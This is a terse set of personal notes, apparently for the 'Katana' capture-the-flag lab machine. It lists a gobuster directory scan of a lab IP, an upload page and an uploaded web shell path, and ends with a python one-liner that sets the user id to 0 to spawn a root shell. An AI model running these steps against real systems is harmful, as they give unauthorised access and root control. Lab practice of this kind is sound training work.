----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Katana
# 2/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------










gobuster dir -u http://192.168.75.83:8088 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x html 
http://192.168.75.83:8088/upload.html
http://192.168.75.83:8715/katana_shell.php


/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
